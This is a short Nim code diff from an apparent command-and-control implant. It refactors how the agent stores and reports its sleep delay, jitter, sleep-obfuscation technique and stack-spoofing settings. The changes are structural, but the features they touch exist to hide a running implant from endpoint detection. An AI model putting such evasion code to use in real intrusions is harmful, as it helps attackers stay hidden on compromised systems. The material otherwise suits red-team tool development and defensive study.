@@ -50,11 +50,11 @@ when defined(agent):
 
         try: 
             # Parse task parameter
-            let delay = int(Bytes.toUint32(task.args[0].data))
+            let delay = Bytes.toUint32(task.args[0].data)
 
             # Updating sleep in agent context
             print fmt"   [>] Setting sleep delay to {delay} seconds."
-            ctx.sleep = delay
+            ctx.sleepSettings.sleepDelay = delay
                     
             return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
@@ -69,21 +69,21 @@ when defined(agent):
             case int(task.argCount): 
             of 0: 
                 # Retrieve sleepmask settings 
-                let response = fmt"Sleepmask settings: Technique: {$ctx.sleepTechnique}, Delay: {$ctx.sleep}ms, Stack spoofing: {$ctx.spoofStack}"
+                let response = fmt"Sleepmask settings: Technique: {$ctx.sleepSettings.sleepTechnique}, Delay: {$ctx.sleepSettings.sleepDelay}ms, Jitter: {$ctx.sleepSettings.jitter}, Stack spoofing: {$ctx.sleepSettings.spoofStack}"
                 return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(response))
 
             of 1: 
                 # Only set the sleepmask technique
                 let technique = parseEnum[SleepObfuscationTechnique](Bytes.toString(task.args[0].data).toUpperAscii())
-                ctx.sleepTechnique = technique
+                ctx.sleepSettings.sleepTechnique = technique
 
             else: 
                 # Set sleepmask technique and stack-spoofing configuration
                 let technique = parseEnum[SleepObfuscationTechnique](Bytes.toString(task.args[0].data).toUpperAscii())
-                ctx.sleepTechnique = technique
+                ctx.sleepSettings.sleepTechnique = technique
 
                 let spoofStack = cast[bool](task.args[1].data[0]) # BOOLEAN values are just 1 byte
-                ctx.spoofStack = spoofStack
+                ctx.sleepSettings.spoofStack = spoofStack
 
             return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
